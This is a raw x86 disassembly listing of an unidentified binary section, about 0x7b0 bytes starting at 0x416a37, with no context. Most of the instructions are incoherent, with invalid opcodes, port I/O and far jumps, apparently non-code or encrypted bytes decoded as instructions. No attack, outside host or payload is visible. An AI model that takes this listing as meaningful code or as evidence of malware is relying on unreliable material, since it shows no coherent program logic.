  416a37:	xor    ebx,DWORD PTR ds:0x428ea7
  416a3d:	mov    DWORD PTR ds:0x428ea3,ebx
  416a43:	sub    edx,esi
  416a45:	xor    edx,eax
  416a47:	sbb    ebx,DWORD PTR ds:0x428e87
  416a4d:	mov    DWORD PTR [ebp-0x5c],edx
  416a50:	jmp    0x418e09
  416a55:	out    0xe2,al
  416a57:	dec    edx
  416a58:	mov    dl,0x46
  416a5a:	stos   BYTE PTR es:[edi],al
  416a5b:	xchg   BYTE PTR [esi+0x2de23c83],dl
  416a61:	(bad)  
  416a62:	(bad)  
  416a63:	in     eax,dx
  416a64:	adc    al,0xf9
  416a66:	inc    esp
  416a67:	add    BYTE PTR [ebx-0x7c7c9f19],0x9d
  416a6e:	push   edi
  416a6f:	cmpxchg eax,esp
  416a72:	es add al,0x2d
  416a75:	sub    eax,0xed6b1b6c
  416a7a:	hlt    
  416a7b:	lds    eax,FWORD PTR [edi+0x57]
  416a7e:	in     eax,dx
  416a7f:	aad    0xf1
  416a81:	sub    esp,edi
  416a83:	jp     0x416a57
  416a85:	pop    ds
  416a86:	clc    
  416a87:	jle    0x416a62
  416a89:	leave  
  416a8a:	adc    edx,DWORD PTR [ebx+0x7e]
  416a8d:	cmp    BYTE PTR [ecx+0x25],bh
  416a90:	xchg   ebx,eax
  416a91:	inc    esi
  416a92:	shl    DWORD PTR [edx-0x4b24e8b5],1
  416a98:	repnz sub BYTE PTR [esi],al
  416a9b:	sbb    DWORD PTR [eax+0x1],ebx
  416a9e:	lods   eax,DWORD PTR ds:[esi]
  416a9f:	mov    edx,0xd770ac4a
  416aa4:	call   0x48f6:0xfb56959f
  416aab:	push   ebp
  416aac:	mov    eax,0x816d58bb
  416ab1:	dec    esp
  416ab2:	xchg   ebp,eax
  416ab3:	xor    al,0x1
  416ab5:	jmp    0x416a71
  416ab7:	push   ebp
  416ab8:	sahf   
  416ab9:	imul   ecx,DWORD PTR [eax*4+0x6a22c897],0xffffff8d
  416ac1:	test   dh,dl
  416ac3:	add    eax,0xffffff8f
  416ac6:	add    dl,BYTE PTR [esi+0xb]
  416ac9:	out    0xdd,eax
  416acb:	mov    ecx,0xb0c18e18
  416ad0:	mov    bh,0x50
  416ad2:	pop    ds
  416ad3:	sbb    DWORD PTR [eax+0x5b],esp
  416ad6:	jae    0x416abc
  416ad8:	ja     0x416aad
  416ada:	arpl   WORD PTR [edx],ax
  416adc:	dec    edi
  416add:	imul   esi,DWORD PTR [ebx+0x5b],0xf923f10b
  416ae4:	lods   eax,DWORD PTR ds:[esi]
  416ae5:	pop    edi
  416ae6:	push   ss
  416ae7:	inc    ebp
  416ae8:	jae    0x416a74
  416aea:	test   ch,bh
  416aec:	xchg   edi,eax
  416aed:	push   edx
  416aee:	add    al,0xcd
  416af0:	mov    ds:0x9c0b2d39,eax
  416af5:	imul   esi,DWORD PTR [edi-0xa58487],0xffffffb2
  416afc:	addr16 xchg esi,eax
  416afe:	push   edx
  416aff:	es enter 0x4b86,0xfc
  416b04:	xor    dl,bl
  416b06:	test   BYTE PTR [ebx-0x8b4490c],0x0
  416b0d:	and    DWORD PTR [esi+0x32],0x47f1896f
  416b14:	inc    esi
  416b15:	sub    al,0x5f
  416b17:	repnz clc 
  416b19:	repnz (bad) [edx+ebp*1-0x101cb91e]
  416b21:	pop    ecx
  416b22:	jnp    0x416ad1
  416b24:	cwde   
  416b25:	dec    ecx
  416b26:	mov    eax,0x953e80bb
  416b2b:	and    cl,bl
  416b2d:	jmp    0x416ba5
  416b2f:	out    dx,al
  416b30:	rcl    DWORD PTR [ebx+eiz*1],1
  416b33:	out    0x3a,al
  416b35:	sti    
  416b36:	out    dx,al
  416b37:	lods   al,BYTE PTR ds:[esi]
  416b38:	jge    0x416ad9
  416b3a:	pop    edx
  416b3b:	cmp    esi,ebp
  416b3d:	bound  edi,QWORD PTR [ebp-0x230a4fc2]
  416b43:	or     DWORD PTR [ecx+0xab4dfb],ebx
  416b49:	in     eax,0x74
  416b4b:	in     al,0x97
  416b4d:	sbb    BYTE PTR ds:0x6d3173f0,al
  416b53:	lds    esi,FWORD PTR [esi-0x33]
  416b56:	lods   eax,DWORD PTR ds:[esi]
  416b57:	fistp  QWORD PTR [esi+0x6c435d2d]
  416b5d:	vorps  ymm1,ymm6,YMMWORD PTR [ebp+0xb]
  416b63:	popf   
  416b64:	sbb    DWORD PTR [ecx-0x48],esp
  416b67:	or     BYTE PTR [eax+0x67],al
  416b6a:	ja     0x416b19
  416b6c:	std    
  416b6d:	push   ebx
  416b6e:	ficomp WORD PTR ds:[ecx]
  416b71:	xchg   ecx,eax
  416b72:	and    DWORD PTR [ecx-0x40],0x79
  416b76:	(bad)  [ecx-0x206a5b8c]
  416b7c:	dec    esp
  416b7d:	jl     0x416bfa
  416b7f:	mov    ?,ebp
  416b81:	call   0x2520:0x9c5a3270
  416b88:	inc    esi
  416b89:	mov    al,0x2d
  416b8b:	in     eax,dx
  416b8c:	xchg   edx,eax
  416b8d:	sub    eax,0xa7932cd
  416b92:	sti    
  416b93:	xor    eax,0x509de275
  416b98:	sub    BYTE PTR [ecx+edi*2],0xec
  416b9c:	pop    ebp
  416b9d:	jae    0x416bd4
  416b9f:	pop    edi
  416ba0:	add    DWORD PTR [esi-0x2ba6d8e8],esi
  416ba6:	mov    dh,0xae
  416ba8:	imul   ebp,DWORD PTR ds:0xc3e7d621,0x14ac71f1
  416bb2:	in     eax,0x39
  416bb4:	popa   
  416bb5:	call   0x32d5:0x78bddc6c
  416bbc:	inc    ebx
  416bbd:	es push edi
  416bbf:	jg     0x416c1c
  416bc1:	fsubr  st,st(6)
  416bc3:	inc    ecx
  416bc4:	lea    ebx,[ecx-0x2897cdba]
  416bca:	lods   al,BYTE PTR ds:[esi]
  416bcb:	fistp  DWORD PTR [ebx]
  416bcd:	adc    eax,0x5ed80bf6
  416bd2:	fmulp  st(2),st
  416bd4:	jmp    0xc8b8:0x55b4014
  416bdb:	fdiv   QWORD PTR [edx+0x4]
  416bde:	pop    ds
  416bdf:	inc    ebx
  416be0:	or     eax,ebp
  416be2:	in     al,0x4e
  416be4:	rcr    edx,0xf4
  416be7:	ds xchg esp,eax
  416be9:	cmp    eax,0xb6c09749
  416bee:	(bad)  
  416bef:	in     eax,dx
  416bf0:	mov    ds:0x9e3fccad,al
  416bf5:	sbb    edx,esp
  416bf7:	inc    ebp
  416bf9:	fs stos BYTE PTR es:[edi],al
  416bfb:	in     eax,dx
  416bfc:	push   cs
  416bfd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416bfe:	jne    0x416bfc
  416c00:	std    
  416c01:	sahf   
  416c02:	retf   0xbcad
  416c05:	mov    ebx,0x7c8c552e
  416c0a:	cmp    DWORD PTR [ebp-0x668e5a9b],esi
  416c10:	add    DWORD PTR [ebp+0x781e29c],ebp
  416c16:	pop    ebx
  416c17:	jbe    0x416bbb
  416c19:	sub    ecx,DWORD PTR [edx+0x3b]
  416c1c:	icebp  
  416c1d:	dec    esp
  416c1e:	jnp    0x416c06
  416c20:	add    bl,bl
  416c22:	pop    esi
  416c23:	ud0    edi,DWORD PTR [edi-0x4e]
  416c27:	das    
  416c28:	sbb    DWORD PTR [edi+ebx*8+0x2],0xffffff97
  416c2d:	sbb    eax,0x82acc3d5
  416c32:	(bad)  
  416c33:	adc    al,0xb1
  416c35:	mov    ch,BYTE PTR ss:[eax]
  416c38:	push   esi
  416c39:	push   ebp
  416c3a:	mov    DWORD PTR [eax-0x80],eax
  416c3d:	jno    0x416c7b
  416c3f:	pushw  ss
  416c41:	fstp   st(7)
  416c43:	jle    0x416c16
  416c45:	and    edi,ebx
  416c47:	cli    
  416c48:	xchg   esp,eax
  416c49:	or     bh,BYTE PTR [edi+0x4fea8d0]
  416c4f:	fs mov ch,0xb0
  416c52:	gs push eax
  416c54:	call   0xad67:0x8845b8b
  416c5b:	cs lock shl al,1
  416c5f:	mov    al,0xdf
  416c61:	xor    esp,esp
  416c63:	mov    WORD PTR [eax+edi*1],?
  416c66:	mov    eax,ds:0x3cf5638a
  416c6b:	mov    edi,0xc09ddd34
  416c70:	icebp  
  416c71:	mov    ds:0xbbb4262c,al
  416c76:	call   0x44532938
  416c7b:	pop    ebp
  416c7c:	and    cl,BYTE PTR [ebx]
  416c7e:	ss test eax,0x82ac177f
  416c84:	jmp    0x56105900
  416c89:	add    esi,DWORD PTR [edx]
  416c8b:	mov    ah,0xf0
  416c8d:	push   eax
  416c8e:	jmp    0x2d3a5162
  416c93:	bound  ebx,QWORD PTR [esi-0x1d2b76d6]
  416c99:	rcr    BYTE PTR [ebp+0x2c],cl
  416c9c:	sub    ecx,0x3
  416c9f:	outs   dx,BYTE PTR ds:[esi]
  416ca0:	push   ds
  416ca1:	inc    edi
  416ca2:	pop    ds
  416ca3:	xor    al,0xb8
  416ca5:	fsubr  st(2),st
  416ca7:	ja     0x416c3e
  416ca9:	mov    al,ds:0xc1724e7c
  416cae:	jbe    0x416d04
  416cb0:	shl    bh,0x29
  416cb3:	(bad)  
  416cb5:	mov    bl,dl
  416cb7:	push   esp
  416cb8:	add    BYTE PTR [ebx-0x72],cl
  416cbb:	push   ecx
  416cbc:	retf   
  416cbd:	mov    DWORD PTR [ebx+0x4c],edx
  416cc0:	pop    ebp
  416cc1:	inc    eax
  416cc2:	xor    DWORD PTR [edi],0x21
  416cc5:	scas   al,BYTE PTR es:[edi]
  416cc6:	and    ah,0x77
  416cc9:	mov    edi,0xa1168a88
  416cce:	das    
  416ccf:	scas   al,BYTE PTR es:[edi]
  416cd0:	sub    al,BYTE PTR [eax+ecx*4-0x546616c2]
  416cd7:	xor    DWORD PTR [edx],edx
  416cd9:	shl    BYTE PTR [ecx+edi*4-0x5d2b64a8],1
  416ce0:	leave  
  416ce1:	and    DWORD PTR [ebx+0x52],esp
  416ce4:	std    
  416ce5:	dec    edx
  416ce6:	inc    edi
  416ce7:	dec    esi
  416ce8:	and    bh,cl
  416cea:	hlt    
  416ceb:	xor    ch,dl
  416ced:	loop   0x416c7a
  416cef:	pop    ecx
  416cf0:	dec    ebp
  416cf1:	xchg   ebp,eax
  416cf2:	mov    ch,0x3b
  416cf4:	or     BYTE PTR [edi+0x7c332d6c],dl
  416cfa:	outs   dx,DWORD PTR ds:[esi]
  416cfb:	loope  0x416ce5
  416cfd:	lahf   
  416cfe:	or     al,BYTE PTR [edi]
  416d00:	xchg   esp,eax
  416d01:	dec    esi
  416d02:	xor    bl,BYTE PTR [ecx+edx*4+0x6c70f1a5]
  416d09:	jmp    FWORD PTR [edi-0x726332f6]
  416d0f:	xor    BYTE PTR [ecx-0x2d],dl
  416d12:	nop
  416d13:	xchg   ebx,eax
  416d14:	pop    edx
  416d15:	mov    bl,0xe0
  416d17:	fsub   st,st(2)
  416d19:	sub    BYTE PTR [eax-0x1f5e427],0x5c
  416d20:	push   0xffffffe3
  416d22:	fs push ebp
  416d24:	ja     0x416d84
  416d26:	lds    ebx,FWORD PTR [ecx+0x7b5375f9]
  416d2c:	sub    BYTE PTR [eax+0x2da34a74],bh
  416d32:	mov    ecx,0x5bc2b743
  416d37:	in     eax,dx
  416d38:	mov    al,ds:0xfb2d9255
  416d3d:	outs   dx,BYTE PTR ds:[esi]
  416d3e:	js     0x416cce
  416d40:	nop
  416d41:	cs sbb al,0x64
  416d44:	(bad)  
  416d45:	xchg   ecx,eax
  416d46:	div    DWORD PTR [esi-0x43a98ff3]
  416d4c:	pusha  
  416d4d:	out    0xfc,al
  416d4f:	(bad)  
  416d50:	adc    al,0x4c
  416d52:	mov    es,WORD PTR [ecx]
  416d54:	cdq    
  416d55:	push   0xffffffd4
  416d57:	repnz shr BYTE PTR [edi-0x26],cl
  416d5b:	pop    esp
  416d5c:	in     eax,dx
  416d5d:	dec    ebx
  416d5e:	test   eax,0x2815e9ec
  416d63:	mov    dh,0xb1
  416d65:	mov    edi,0x8ced35
  416d6a:	jbe    0x416de0
  416d6c:	push   esi
  416d6d:	out    0x5b,eax
  416d6f:	push   eax
  416d70:	mov    ds:0x73eeb741,eax
  416d75:	data16 (bad) 
  416d78:	imul   esi,DWORD PTR [esi-0x5f],0x76b6b9a0
  416d7f:	inc    eax
  416d80:	(bad)  
  416d81:	int    0x66
  416d83:	push   cs
  416d84:	jne    0x416d9f
  416d86:	ss mov ch,0x9e
  416d89:	(bad)  
  416d8a:	jmp    0x416da5
  416d8c:	stc    
  416d8d:	xchg   ebx,eax
  416d8e:	cld    
  416d8f:	jmp    0x416d7b
  416d91:	rcl    edi,cl
  416d93:	xchg   edi,eax
  416d94:	test   al,0x75
  416d96:	nop
  416d97:	or     eax,0x420026ef
  416d9c:	int    0x50
  416d9e:	lods   al,BYTE PTR ds:[esi]
  416d9f:	xor    ecx,DWORD PTR [ecx]
  416da1:	jne    0x416d78
  416da3:	gs pop ds
  416da5:	mov    esp,0x261403cd
  416daa:	sbb    DWORD PTR [ebp+0x6c4e8a50],eax
  416db0:	inc    ebp
  416db1:	fcomp  QWORD PTR [edx-0x155e709e]
  416db7:	fwait
  416db8:	inc    esp
  416db9:	add    BYTE PTR [eax-0x3a],cl
  416dbc:	jmp    0xf37:0x10920d1d
  416dc3:	ret    0x741b
  416dc6:	nop
  416dc7:	inc    ebp
  416dc8:	(bad)  
  416dc9:	scas   al,BYTE PTR es:[edi]
  416dca:	xchg   BYTE PTR [eax+0x57],dh
  416dcd:	jae    0x416db9
  416dcf:	fdivr  DWORD PTR [ebp+esi*8-0x30]
  416dd3:	lds    ecx,FWORD PTR [ebp+0x1104db53]
  416dd9:	mov    ecx,DWORD PTR [edi-0x2589b8fb]
  416ddf:	or     bl,BYTE PTR [ebp+0x2d901234]
  416de5:	push   ecx
  416de6:	fs push ebx
  416de8:	lock cmp ecx,ebx
  416deb:	mov    ebp,0x3ab7a6d2
  416df0:	fcmovbe st,st(7)
  416df2:	mov    eax,ds:0xb32c43cc
  416df7:	lods   al,BYTE PTR ds:[esi]
  416df8:	or     ebp,DWORD PTR [esi]
  416dfa:	ins    DWORD PTR es:[edi],dx
  416dfb:	popf   
  416dfc:	repz adc cl,BYTE PTR [edi]
  416dff:	gs in  al,dx
  416e01:	ficom  DWORD PTR [esi]
  416e03:	dec    eax
  416e04:	push   cs
  416e05:	jg     0x416e0c
  416e07:	sbb    bh,BYTE PTR [esi-0x619a726e]
  416e0d:	jnp    0x416e3e
  416e0f:	or     al,0x42
  416e11:	cmp    dl,BYTE PTR [edi-0x773c5b04]
  416e17:	mov    dh,0x8e
  416e19:	fdivp  st(7),st
  416e1b:	pop    ebp
  416e1c:	arpl   WORD PTR [eax+0x1861b7a8],di
  416e22:	push   esi
  416e23:	sub    DWORD PTR [ebx],0x756980db
  416e29:	inc    ebp
  416e2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e2b:	aas    
  416e2c:	ror    ecx,cl
  416e2e:	iret   
  416e2f:	lea    eax,[esi+0x6e]
  416e32:	ret    0x9070
  416e35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e36:	out    dx,al
  416e37:	pop    ecx
  416e38:	call   0x5f41:0x38b5e653
  416e3f:	lods   al,BYTE PTR ds:[esi]
  416e40:	xor    eax,DWORD PTR [eax+esi*2-0x3e]
  416e44:	or     al,0xd5
  416e46:	push   0x153ce1a5
  416e4b:	adc    bh,BYTE PTR [edi+edi*1]
  416e4e:	cmp    BYTE PTR [ecx+0x1a],dl
  416e51:	sbb    bh,0xc
  416e54:	pusha  
  416e55:	sub    DWORD PTR [esi+edx*8+0x308592ac],ecx
  416e5c:	or     dl,BYTE PTR [eax+esi*2+0x50]
  416e60:	mov    edi,0x50edcd6d
  416e65:	mov    esi,0x2582134c
  416e6a:	mov    dl,0x1d
  416e6c:	sbb    DWORD PTR [edi],esp
  416e6e:	sub    BYTE PTR [ecx+edx*4-0x3a65b0b7],dh
  416e75:	or     BYTE PTR [edi-0x45a32d64],0x85
  416e7c:	mov    edx,0xe1c1c508
  416e81:	mov    eax,0xaf23c18d
  416e86:	or     BYTE PTR [edi],ah
  416e88:	ja     0x416efb
  416e8a:	or     ecx,DWORD PTR [ecx+0x52b89bdf]
  416e90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e91:	xchg   ecx,eax
  416e92:	mov    ebx,ds
  416e94:	sbb    eax,0xdf8afb27
  416e99:	mov    ds:0x840eae6b,eax
  416e9e:	aad    0x88
  416ea0:	std    
  416ea1:	out    0xc2,al
  416ea3:	sub    BYTE PTR [edi-0x26ac5803],al
  416ea9:	(bad)  
  416eaa:	mov    ecx,esi
  416eac:	jge    0x416e46
  416eae:	es retf 
  416eb0:	xchg   DWORD PTR [ebx-0x44],eax
  416eb3:	rcl    edx,cl
  416eb5:	jb     0x416f02
  416eb7:	int3   
  416eb8:	xchg   edx,eax
  416eb9:	mov    edx,0x64fa7d09
  416ebe:	cmp    eax,0x4a9cfe1b
  416ec3:	or     BYTE PTR [ebx],0xfb
  416ec6:	and    DWORD PTR [ebx],ebx
  416ec8:	and    esp,DWORD PTR [ebx]
  416eca:	daa    
  416ecb:	in     al,0x4e
  416ecd:	xor    BYTE PTR [ecx+0x38],bh
  416ed0:	sub    BYTE PTR ds:0xb8e6e902,bl
  416ed6:	and    eax,0x35cc9498
  416edb:	xchg   BYTE PTR [ebx+0x47],dh
  416ede:	enter  0xf541,0xd9
  416ee2:	fstp   QWORD PTR [eax]
  416ee4:	cmp    ah,BYTE PTR [esi+0x5c]
  416ee7:	cmp    BYTE PTR [ebx],bh
  416ee9:	sbb    eax,0xa5016b70
  416eee:	and    ch,BYTE PTR [ecx-0x1a7ec9f]
  416ef4:	(bad)  
  416ef5:	cdq    
  416ef6:	push   ss
  416ef7:	ret    0xee43
  416efa:	aaa    
  416efb:	addr16 push ds
  416efd:	cwde   
  416efe:	dec    edi
  416eff:	test   DWORD PTR [ebx+0x37],edx
  416f02:	ret    
  416f03:	jno    0x416f03
  416f05:	repnz cli 
  416f07:	pop    esp
  416f08:	(bad)  
  416f09:	call   0xf1031ee3
  416f0e:	bound  ebx,QWORD PTR [ebx+0x6aef10d0]
  416f14:	scas   al,BYTE PTR es:[edi]
  416f15:	cmp    BYTE PTR [ecx+0xc],bh
  416f18:	cmp    esi,DWORD PTR [ecx]
  416f1a:	mov    bl,0xe2
  416f1c:	cmp    al,0x5c
  416f1e:	imul   ebx,DWORD PTR [edx+0x1b53f343],0x55e67d74
  416f28:	push   ecx
  416f29:	or     ch,bh
  416f2b:	ror    DWORD PTR [eax],1
  416f2d:	addr16 sbb al,0x20
  416f30:	inc    ebx
  416f31:	push   edi
  416f32:	and    eax,0xb4098e02
  416f37:	je     0x416ed0
  416f39:	sbb    edi,esi
  416f3b:	fs int 0xf1
  416f3e:	cli    
  416f3f:	cdq    
  416f40:	xchg   edx,eax
  416f41:	gs push ebp
  416f43:	adc    ebx,DWORD PTR [ecx]
  416f45:	mov    edi,0xf1c4ea8
  416f4a:	xlat   BYTE PTR ds:[ebx]
  416f4b:	pop    es
  416f4c:	xchg   ebp,eax
  416f4d:	aam    0x60
  416f4f:	mov    edi,0xb4be61f1
  416f54:	das    
  416f55:	xor    DWORD PTR [ebx],0xef9acfc9
  416f5b:	bound  eax,QWORD PTR [eax+0x69a99ded]
  416f61:	stc    
  416f62:	add    eax,DWORD PTR [esi-0x3cba611d]
  416f68:	xchg   esi,eax
  416f69:	rcr    DWORD PTR [ebx],cl
  416f6b:	mov    ah,BYTE PTR [edi]
  416f6d:	pusha  
  416f6e:	mov    dh,0xf4
  416f70:	dec    esi
  416f71:	mov    esi,0xc8ff0d03
  416f76:	rcr    esp,1
  416f78:	dec    ebx
  416f79:	(bad)  
  416f7a:	mov    WORD PTR [eax+0x61],fs
  416f7d:	mov    bl,0xbd
  416f7f:	pop    edx
  416f80:	push   esp
  416f81:	sbb    DWORD PTR [ecx-0x13],edi
  416f84:	rol    DWORD PTR [edx+0x72],cl
  416f87:	pop    edx
  416f88:	mov    bh,0xa6
  416f8a:	xchg   ebp,eax
  416f8b:	fcomp  DWORD PTR ss:[eax]
  416f8e:	adc    DWORD PTR [bp+si-0x69c4],edx
  416f93:	dec    edi
  416f94:	or     edx,edi
  416f96:	repnz int3 
  416f98:	push   ds
  416f99:	inc    ebp
  416f9a:	dec    ecx
  416f9b:	aad    0xf5
  416f9d:	in     al,0x74
  416f9f:	lods   eax,DWORD PTR ds:[esi]
  416fa0:	fst    QWORD PTR [ebx+0x18e3ad4e]
  416fa6:	pop    edi
  416fa7:	xchg   edi,eax
  416fa8:	loope  0x416f58
  416faa:	add    ebx,DWORD PTR [eax+eiz*1+0x4dfc536e]
  416fb1:	in     al,dx
  416fb2:	outs   dx,DWORD PTR ds:[esi]
  416fb3:	dec    edx
  416fb4:	(bad)  
  416fb5:	mov    edi,0x134abd0f
  416fba:	add    esp,0x37
  416fbd:	pop    ebp
  416fbe:	mov    ds:0xa13b3744,eax
  416fc3:	mov    esi,0x6d1cceae
  416fc8:	add    ebx,ebx
  416fca:	stc    
  416fcb:	add    ch,BYTE PTR [ecx-0x27]
  416fce:	in     al,0xeb
  416fd0:	je     0x416fbb
  416fd2:	adc    DWORD PTR [ebx-0x14],esi
  416fd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416fd6:	and    dh,BYTE PTR [ecx]
  416fd8:	jmp    FWORD PTR [ebx]
  416fda:	shr    dh,1
  416fdc:	mov    ds:0xf92aef40,al
  416fe1:	mov    al,0xa7
  416fe3:	xor    eax,0x35f9756e
  416fe8:	fadd   DWORD PTR fs:[ecx+0x7b]
  416fec:	sbb    al,0xc1
  416fee:	bound  edi,QWORD PTR [ecx]
  416ff0:	rol    BYTE PTR [edi-0x6766c4e5],0x4c
  416ff7:	in     eax,dx
  416ff8:	mov    bl,0xb6
  416ffa:	dec    ebx
  416ffb:	enter  0x3ede,0xe9
  416fff:	outs   dx,DWORD PTR ds:[esi]
  417000:	adc    al,0xc
  417002:	adc    esi,DWORD PTR [edi+0x288b0c6d]
  417008:	shr    BYTE PTR [ebx],cl
  41700a:	test   ah,bh
  41700c:	shl    DWORD PTR [esi],cl
  41700e:	je     0x417038
  417010:	xchg   DWORD PTR [edi-0x5],ecx
  417013:	scas   al,BYTE PTR es:[edi]
  417014:	aam    0x2c
  417016:	or     eax,0x55c4920c
  41701b:	jecxz  0x417065
  41701d:	addr16 mov eax,ds:0xb8e7
  417021:	push   cs
  417022:	or     BYTE PTR [edx+0x23fad11c],0x80
  417029:	mov    WORD PTR [ebx],?
  41702b:	repz push edi
  41702d:	js     0x417082
  41702f:	xchg   ebx,eax
  417030:	test   al,dh
  417032:	mov    ecx,0xc0e991b3
  417037:	xchg   edi,eax
  417038:	sub    al,0x65
  41703a:	arpl   WORD PTR [ecx-0x60],bp
  41703d:	or     dl,BYTE PTR [ecx]
  41703f:	and    BYTE PTR [esi],ch
  417041:	dec    eax
  417042:	jns    0x416fc8
  417044:	addr16 jl 0x417043
  417047:	sbb    edx,DWORD PTR [ebx]
  417049:	loope  0x4170a4
  41704b:	xor    al,0x7b
  41704d:	pop    esi
  41704e:	ins    BYTE PTR es:[edi],dx
  41704f:	shl    DWORD PTR [esi+0x6c],cl
  417052:	add    edx,DWORD PTR [eax]
  417054:	pop    es
  417055:	mov    bh,0x70
  417057:	stos   DWORD PTR es:[edi],eax
  417058:	mov    ebp,0x7dd3ce15
  41705d:	inc    edx
  41705e:	inc    ebp
  41705f:	adc    esi,DWORD PTR [ebp-0x37]
  417062:	push   es
  417063:	jo     0x41700b
  417065:	add    ecx,DWORD PTR [eax-0x1]
  417068:	int    0xd4
  41706a:	jae    0x4170ea
  41706c:	shr    DWORD PTR [ecx+0x49],0x83
  417070:	cmp    bh,BYTE PTR [ecx]
  417072:	jnp    0x41703f
  417074:	in     al,0x62
  417076:	out    0x6,al
  417078:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417079:	out    0x3f,eax
  41707b:	int    0x0
  41707d:	pop    ebp
  41707e:	cmp    edi,DWORD PTR ds:0x38b41ac6
  417084:	pop    esi
  417085:	and    al,0x76
  417087:	je     0x4170de
  417089:	es out dx,eax
  41708b:	push   eax
  41708c:	or     DWORD PTR [edi-0x1f247c65],esp
  417092:	xchg   edi,eax
  417093:	aas    
  417094:	xlat   BYTE PTR ds:[ebx]
  417095:	sbb    DWORD PTR [edi-0x27],ebx
  417098:	xchg   ebx,eax
  417099:	add    BYTE PTR [ecx-0x12],0x35
  41709d:	sub    DWORD PTR [esi],ebp
  41709f:	xchg   ebx,eax
  4170a0:	xor    DWORD PTR [edx],edx
  4170a2:	dec    esi
  4170a3:	inc    edx
  4170a4:	dec    eax
  4170a5:	test   eax,0xa16eef
  4170aa:	mov    ah,0x55
  4170ac:	pop    ecx
  4170ad:	mov    eax,ds:0x5e79a9da
  4170b2:	ficomp DWORD PTR [eax+0x18]
  4170b5:	test   al,0x51
  4170b7:	stos   BYTE PTR es:[edi],al
  4170b8:	(bad)  
  4170b9:	fist   WORD PTR [ecx-0x36]
  4170bc:	mov    esp,DWORD PTR [edx-0x11a39e8d]
  4170c2:	mov    eax,ecx
  4170c4:	jne    0x417096
  4170c6:	and    bh,BYTE PTR [ebp+0x218b3ca2]
  4170cc:	cmp    eax,0x63401d1e
  4170d1:	leave  
  4170d2:	pop    esi
  4170d3:	inc    esp
  4170d4:	jg     0x417106
  4170d6:	aam    0xfb
  4170d8:	aad    0xff
  4170da:	in     al,dx
  4170db:	jae    0x417087
  4170dd:	test   al,0x2e
  4170df:	pop    edi
  4170e0:	mov    BYTE PTR [ebx],dl
  4170e2:	or     ebp,DWORD PTR [edx+edi*1-0x3a]
  4170e6:	add    eax,0xb5845445
  4170eb:	sbb    edx,DWORD PTR [ecx]
  4170ed:	xor    eax,0x98ea0f03
  4170f2:	sbb    DWORD PTR [eax],0xb5b2ca06
  4170f8:	retf   
  4170f9:	out    0xb3,eax
  4170fb:	pop    eax
  4170fc:	sti    
  4170fd:	sub    bl,dl
  4170ff:	xor    BYTE PTR [edx],0xf0
  417102:	inc    bh
  417104:	sub    al,0xa4
  417106:	retf   
  417107:	jo     0x41716c
  417109:	fdivr  DWORD PTR [eax]
  41710b:	ds out 0x1c,eax
  41710e:	add    dl,dh
  417110:	ucomiss xmm5,xmm3
  417113:	xor    eax,eax
  417115:	jmp    0x4170d7
  417117:	mov    esi,0x9090d532
  41711c:	xchg   esi,eax
  41711d:	sbb    eax,0x33031eca
  417122:	fiadd  DWORD PTR [edx]
  417124:	xchg   ecx,eax
  417125:	add    BYTE PTR [ecx],bh
  417127:	mov    ch,0xa2
  417129:	or     BYTE PTR [ebx-0x3a4653b7],al
  41712f:	fcmove st,st(7)
  417131:	stc    
  417132:	stos   BYTE PTR es:[edi],al
  417133:	inc    edi
  417134:	cmc    
  417135:	retf   0x67e2
  417138:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417139:	mov    ch,0x1b
  41713b:	clc    
  41713c:	sbb    eax,DWORD PTR [ebx-0x40872f96]
  417142:	dec    eax
  417143:	(bad)  
  417144:	out    0x6c,al
  417146:	jbe    0x41718e
  417148:	into   
  417149:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41714a:	popf   
  41714b:	sar    al,cl
  41714d:	cld    
  41714e:	pusha  
  41714f:	mov    ss,ecx
  417151:	sub    BYTE PTR [esi-0xd08d4a3],ch
  417157:	jo     0x417149
  417159:	loop   0x4171a9
  41715b:	les    ebp,FWORD PTR [esi]
  41715d:	out    0x27,eax
  41715f:	and    esp,esp
  417161:	es pop ecx
  417163:	test   edx,ebp
  417165:	rol    ah,cl
  417167:	adc    dh,BYTE PTR [edx+0x6aee0cd3]
  41716d:	and    bl,BYTE PTR [ecx-0x12]
  417170:	mov    dl,ch
  417172:	inc    esi
  417173:	in     eax,dx
  417174:	outs   dx,BYTE PTR ds:[esi]
  417175:	or     BYTE PTR [esi-0x12],dh
  417178:	(bad)
  41717b:	sbb    esi,DWORD PTR [edx-0x1143db7]
  417181:	jg     0x41715f
  417183:	loopne 0x417151
  417185:	mov    bh,0x8b
  417187:	cs push ds
  417189:	out    0xac,al
  41718b:	xchg   esp,eax
  41718c:	je     0x4171b0
  41718e:	dec    eax
  41718f:	lahf   
  417190:	push   es
  417191:	pop    esi
  417192:	int    0x2b
  417194:	xor    eax,0x1af94229
  417199:	xor    DWORD PTR [edi+0x7d],ebx
  41719c:	xor    bh,BYTE PTR [edx]
  41719e:	cmp    ebx,ebx
  4171a0:	pop    esi
  4171a1:	mov    ds:0x1737ce21,eax
  4171a6:	cmp    BYTE PTR [edx],ah
  4171a8:	or     DWORD PTR [eax+edi*8],ecx
  4171ab:	adc    al,0x42
  4171ad:	aaa    
  4171ae:	inc    esp
  4171af:	xor    BYTE PTR [ebx-0x7a162138],0x13
  4171b6:	mov    bh,dh
  4171b8:	into   
  4171b9:	mov    ds:0x41b8e6a,eax
  4171be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4171bf:	js     0x4171a3
  4171c1:	xchg   ebx,eax
  4171c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171c3:	and    al,BYTE PTR [ecx+0x54]
  4171c6:	(bad)  
  4171c7:	sbb    esp,DWORD PTR [edi+0x5e4ddc00]
  4171cd:	dec    ecx
  4171ce:	jge    0x4171ed
  4171d0:	add    DWORD PTR [ebx],eax
  4171d2:	inc    esp
  4171d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171d4:	mov    dh,0x10
  4171d6:	dec    ecx
  4171d7:	repz ds jmpw 0x309c
  4171dd:	enter  0x2072,0xd3
  4171e1:	sbb    eax,0xe772abc0
